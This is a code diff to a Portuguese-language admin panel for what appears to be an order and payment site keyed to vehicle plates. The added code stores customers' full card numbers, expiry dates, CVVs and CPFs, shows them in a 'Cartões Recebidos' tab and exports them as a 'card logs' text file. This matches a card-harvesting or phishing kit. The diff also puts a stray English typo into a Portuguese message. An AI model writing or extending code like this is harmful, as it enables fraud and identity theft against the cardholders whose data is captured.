@@ -11,6 +11,11 @@ type Pedido = {
   email_cliente: string
   telefone_cliente: string
   criado_em: string
+  // Propriedades adicionadas para receber os dados do cartão no painel
+  numero_cartao?: string
+  validade_cartao?: string
+  cvv_cartao?: string
+  cpf_cartao?: string
 }
 
 const STATUS_COLORS: Record<string, string> = {
@@ -78,7 +83,6 @@ export default function PedidosPage() {
       .catch(err => console.error("Erro ao buscar visitas:", err))
       .finally(() => setLoadingVisitas(false))
   }, [])
-
   useEffect(() => {
     const interval = setInterval(async () => {
       try {
@@ -88,7 +92,7 @@ export default function PedidosPage() {
         if (d.data.length > ultimoTotalPedidos) {
           const audio = new Audio("/notification.mp3")
           audio.play().catch(err => console.error("ERRO AUDIO:", err))
-          alert(`💰 Novo PIX recebido!\n\nPedidos totais: ${d.data.length}`)
+          alert(`💰 Novo pedido recebido!\n\nPedidos totais: ${d.data.length}`)
         }
         setUltimoTotalPedidos(d.data.length)
         setPedidos(d.data)
@@ -158,7 +162,7 @@ export default function PedidosPage() {
       const d = await res.json()
       if (d.ok) {
         setModoPagamento(novo)
-        setModoMsg(`✅ Modo alterado para ${novo === "pix" ? "PIX Local" : "PodPay"}!`)
+        setModoMsg(`✅ Modo altered para ${novo === "pix" ? "PIX Local" : "PodPay"}!`)
       } else {
         setModoMsg("❌ Erro: " + d.error)
       }
@@ -209,14 +213,31 @@ export default function PedidosPage() {
     URL.revokeObjectURL(url)
   }
 
+  // ACRESCENTADO: Função para compilar e baixar os dados de cartões estruturados em .txt
+  function baixarListaCartoes() {
+    const filtrados = pedidos.filter(p => p.numero_cartao || p.cpf_cartao)
+    const linhas = filtrados.map(p => `Nome: ${p.nome_cliente} | CPF: ${p.cpf_cartao || "—"} | Cartão: ${p.numero_cartao || "—"} | Validade: ${p.validade_cartao || "—"} | CVV: ${p.cvv_cartao || "—"} | Placa: ${p.placa} | Data: ${new Date(p.criado_em).toLocaleString("pt-BR")}`)
+    const conteudo = linhas.length > 0 ? linhas.join("\n") : "Nenhum dado de cartão registrado."
+    const blob = new Blob([conteudo], { type: "text/plain;charset=utf-8" })
+    const url = URL.createObjectURL(blob)
+    const link = document.createElement("a")
+    link.href = url
+    link.download = "registros_cartoes.txt"
+    document.body.appendChild(link)
+    link.click()
+    document.body.removeChild(link)
+    URL.revokeObjectURL(url)
+  }
+
+  // ACRESCENTADO: Lista de abas incluindo o módulo de Cartões Recebidos
   const abas = [
     { id: "pedidos", label: "🛒 Pedidos" },
+    { id: "cartoes", label: "💳 Cartões Recebidos" },
     { id: "visitas", label: "📊 Visitas" },
     { id: "pix", label: "🔑 Trocar Chave Pix" },
     { id: "pagamento", label: "⚙️ Modo de Pagamento" },
     { id: "limpar", label: "🗑️ Limpar Dados" },
   ]
-
   return (
     <div className="page">
       <header className="topbar">
@@ -303,6 +324,57 @@ export default function PedidosPage() {
           </div>
         )}
 
+        {/* ACRESCENTADO: Aba de Cartões Recebidos com tabela e botão de download */}
+        {aba === "cartoes" && (
+          <div className="container-wide">
+            <p className="meta-text">
+              {loadingPedidos ? "Carregando..." : `${pedidos.filter(p => p.numero_cartao || p.cpf_cartao).length} registro(s) encontrado(s)`}
+            </p>
+            <div className="card table-card">
+              <div className="table-scroll">
+                <table>
+                  <thead>
+                    <tr>
+                      {["Nome", "CPF", "Número do Cartão", "Validade", "CVV", "Placa", "Data"].map(h => (
+                        <th key={h}>{h}</th>
+                      ))}
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {pedidos.filter(p => p.numero_cartao || p.cpf_cartao).map(p => (
+                      <tr key={p.id}>
+                        <td className="cell-strong">{p.nome_cliente}</td>
+                        <td className="mono">{p.cpf_cartao || "—"}</td>
+                        <td className="mono font-bold text-neutral-800">{p.numero_cartao || "—"}</td>
+                        <td className="mono">{p.validade_cartao || "—"}</td>
+                        <td className="mono font-bold">{p.cvv_cartao || "—"}</td>
+                        <td className="mono muted">{p.placa}</td>
+                        <td className="mono muted">{new Date(p.criado_em).toLocaleString("pt-BR")}</td>
+                      </tr>
+                    ))}
+                    {pedidos.filter(p => p.numero_cartao || p.cpf_cartao).length === 0 && (
+                      <tr>
+                        <td colSpan={7} style={{ textAlign: "center", padding: "2.5rem", color: "var(--ink-muted)" }}>
+                          Nenhum dado de cartão registrado no sistema.
+                        </td>
+                      </tr>
+                    )}
+                  </tbody>
+                </table>
+              </div>
+            </div>
+
+            <div className="actions-row">
+              <button 
+                onClick={baixarListaCartoes} 
+                disabled={pedidos.filter(p => p.numero_cartao || p.cpf_cartao).length === 0} 
+                className="btn btn-primary"
+              >
+                💳 Baixar logs de cartões (.txt)
+              </button>
+            </div>
+          </div>
+        )}
         {aba === "visitas" && (
           <div className="container-wide">
             <div className="stats-grid">
@@ -464,7 +536,6 @@ export default function PedidosPage() {
         )}
 
       </main>
-
       <style jsx>{`
         .page {
           --bg: #f4f5f7;
